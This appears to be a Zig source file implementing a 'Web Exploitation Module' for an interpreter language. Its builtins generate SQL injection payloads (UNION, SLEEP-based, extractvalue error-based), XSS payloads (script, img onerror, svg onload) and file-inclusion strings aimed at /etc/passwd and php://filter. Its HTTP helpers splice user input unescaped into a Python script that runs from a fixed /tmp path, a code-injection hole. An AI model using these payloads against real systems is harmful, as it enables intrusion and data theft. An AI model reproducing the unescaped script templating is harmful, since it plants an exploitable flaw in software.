// PC Language - Web Exploitation Module
const std = @import("std");
const Interpreter = @import("../interpreter.zig").Interpreter;
const Value = @import("../interpreter.zig").Value;
const InterpreterError = @import("../interpreter.zig").InterpreterError;

// ============================================================================
// HTTP Client Functions
// ============================================================================

// http_get(url) - Simple HTTP GET request
pub fn builtin_http_get(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len == 0 or args[0] != .String) {
        return Value{ .String = "" };
    }
    
    const url = args[0].String;
    
    // Use curl for HTTP requests
    const script = try std.fmt.allocPrint(interp.allocator,
        \\import requests
        \\try:
        \\    resp = requests.get("{s}", timeout=10)
        \\    print(resp.text)
        \\except Exception as e:
        \\    print(f"Error: {{e}}")
    , .{url});
    defer interp.allocator.free(script);
    
    const result = executePythonScript(interp.allocator, script) catch return Value{ .String = "" };
    return Value{ .String = result };
}

// http_post(url, data) - Simple HTTP POST request
pub fn builtin_http_post(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 2 or args[0] != .String or args[1] != .String) {
        return Value{ .String = "" };
    }
    
    const url = args[0].String;
    const data = args[1].String;
    
    const script = try std.fmt.allocPrint(interp.allocator,
        \\import requests
        \\try:
        \\    resp = requests.post("{s}", data="{s}", timeout=10)
        \\    print(resp.text)
        \\except Exception as e:
        \\    print(f"Error: {{e}}")
    , .{url, data});
    defer interp.allocator.free(script);
    
    const result = executePythonScript(interp.allocator, script) catch return Value{ .String = "" };
    return Value{ .String = result };
}

// ============================================================================
// SQL Injection Payloads
// ============================================================================

// sqli_union(columns, table, fields) - Generate UNION-based SQLi payload
pub fn builtin_sqli_union(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len < 1 or args[0] != .Int) {
        return Value{ .String = "" };
    }
    
    const columns = args[0].Int;
    var table: []const u8 = "information_schema.tables";
    var fields: []const u8 = "table_name";
    
    if (args.len >= 2 and args[1] == .String) {
        table = args[1].String;
    }
    if (args.len >= 3 and args[2] == .String) {
        fields = args[2].String;
    }
    
    // Generate NULL columns
    var nulls = std.ArrayList(u8).init(interp.allocator);
    defer nulls.deinit();
    
    var i: i64 = 0;
    while (i < columns - 1) : (i += 1) {
        try nulls.appendSlice("NULL,");
    }
    
    const payload = try std.fmt.allocPrint(interp.allocator,
        "' UNION SELECT {s}{s} FROM {s}--",
        .{nulls.items, fields, table}
    );
    
    return Value{ .String = payload };
}

// sqli_time_based(seconds) - Time-based blind SQLi payload
pub fn builtin_sqli_time_based(interp: *Interpreter, args: []Value) InterpreterError!Value {
    var seconds: i64 = 5;
    if (args.len >= 1 and args[0] == .Int) {
        seconds = args[0].Int;
    }
    
    const payload = try std.fmt.allocPrint(interp.allocator,
        "' AND SLEEP({})--",
        .{seconds}
    );
    
    return Value{ .String = payload };
}

// sqli_error_based() - Error-based SQLi payload
pub fn builtin_sqli_error_based(interp: *Interpreter, _: []Value) InterpreterError!Value {
    const payload = try interp.allocator.dupe(u8, 
        "' AND extractvalue(1,concat(0x7e,version()))--"
    );
    return Value{ .String = payload };
}

// ============================================================================
// XSS Payloads
// ============================================================================

// xss_basic(payload) - Basic XSS payload wrapper
pub fn builtin_xss_basic(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len == 0 or args[0] != .String) {
        const default_payload = try interp.allocator.dupe(u8, "<script>alert(1)</script>");
        return Value{ .String = default_payload };
    }
    
    return args[0];
}

// xss_img_onerror() - IMG tag onerror XSS
pub fn builtin_xss_img_onerror(interp: *Interpreter, args: []Value) InterpreterError!Value {
    var js_code: []const u8 = "alert(1)";
    if (args.len >= 1 and args[0] == .String) {
        js_code = args[0].String;
    }
    
    const payload = try std.fmt.allocPrint(interp.allocator,
        "<img src=x onerror=\"{s}\">",
        .{js_code}
    );
    
    return Value{ .String = payload };
}

// xss_svg_onload() - SVG onload XSS
pub fn builtin_xss_svg_onload(interp: *Interpreter, args: []Value) InterpreterError!Value {
    var js_code: []const u8 = "alert(1)";
    if (args.len >= 1 and args[0] == .String) {
        js_code = args[0].String;
    }
    
    const payload = try std.fmt.allocPrint(interp.allocator,
        "<svg onload=\"{s}\">",
        .{js_code}
    );
    
    return Value{ .String = payload };
}

// ============================================================================
// File Inclusion
// ============================================================================

// lfi_linux(file) - Linux LFI payload
pub fn builtin_lfi_linux(interp: *Interpreter, args: []Value) InterpreterError!Value {
    var file: []const u8 = "/etc/passwd";
    if (args.len >= 1 and args[0] == .String) {
        file = args[0].String;
    }
    
    const payload = try std.fmt.allocPrint(interp.allocator,
        "../../../../../../{s}",
        .{file}
    );
    
    return Value{ .String = payload };
}

// lfi_php_wrapper(resource) - PHP wrapper for LFI
pub fn builtin_lfi_php_wrapper(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len == 0 or args[0] != .String) {
        return Value{ .String = "" };
    }
    
    const resource = args[0].String;
    const payload = try std.fmt.allocPrint(interp.allocator,
        "php://filter/read=convert.base64-encode/resource={s}",
        .{resource}
    );
    
    return Value{ .String = payload };
}

// ============================================================================
// URL Encoding
// ============================================================================

// url_encode(string) - URL percent encoding
pub fn builtin_url_encode(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len == 0 or args[0] != .String) {
        return Value{ .String = "" };
    }
    
    const input = args[0].String;
    var result = std.ArrayList(u8).init(interp.allocator);
    
    const unreserved = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~";
    
    for (input) |c| {
        if (std.mem.indexOfScalar(u8, unreserved, c) != null) {
            try result.append(c);
        } else {
            const encoded = try std.fmt.allocPrint(interp.allocator, "%{X:0>2}", .{c});
            defer interp.allocator.free(encoded);
            try result.appendSlice(encoded);
        }
    }
    
    return Value{ .String = try result.toOwnedSlice() };
}

// url_decode(string) - URL percent decoding
pub fn builtin_url_decode(interp: *Interpreter, args: []Value) InterpreterError!Value {
    if (args.len == 0 or args[0] != .String) {
        return Value{ .String = "" };
    }
    
    const input = args[0].String;
    var result = std.ArrayList(u8).init(interp.allocator);
    
    var i: usize = 0;
    while (i < input.len) {
        if (input[i] == '%' and i + 2 < input.len) {
            const hex_str = input[i+1..i+3];
            const byte = std.fmt.parseInt(u8, hex_str, 16) catch {
                try result.append(input[i]);
                i += 1;
                continue;
            };
            try result.append(byte);
            i += 3;
        } else if (input[i] == '+') {
            try result.append(' ');
            i += 1;
        } else {
            try result.append(input[i]);
            i += 1;
        }
    }
    
    return Value{ .String = try result.toOwnedSlice() };
}

// ============================================================================
// Helper Functions
// ============================================================================

fn executePythonScript(allocator: std.mem.Allocator, script: []const u8) ![]u8 {
    // Write script to temp file
    const temp_path = "/tmp/pc_web_script.py";
    {
        const file = try std.fs.cwd().createFile(temp_path, .{});
        defer file.close();
        try file.writeAll(script);
    }
    
    // Execute Python script
    var child = std.process.Child.init(&[_][]const u8{"python3", temp_path}, allocator);
    child.stdout_behavior = .Pipe;
    child.stderr_behavior = .Pipe;
    
    try child.spawn();
    
    const stdout = try child.stdout.?.readToEndAlloc(allocator, 10 * 1024 * 1024);
    _ = try child.wait();
    
    return stdout;
}
